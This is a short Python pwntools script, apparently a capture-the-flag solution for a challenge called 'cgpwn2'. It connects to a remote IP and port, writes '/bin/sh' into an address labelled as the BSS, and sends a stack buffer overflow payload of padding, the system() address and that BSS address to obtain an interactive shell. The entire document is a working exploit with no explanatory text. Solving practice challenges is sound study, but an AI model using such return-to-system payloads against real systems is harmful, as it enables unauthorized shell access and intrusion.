from pwn import *
#p=process('./cgpwn2')
p=remote('111.198.29.45',31510)
sys_addr=0x08048420
bss=0x0804a080
p.recvuntil("please tell me your name")
p.sendline('/bin/sh')
p.recvuntil("hello,you can leave some message here:")
payload='a'*(0x26+0x4)+p32(sys_addr)+'aaaa'+p32(bss)
p.sendline(payload)
p.interactive()
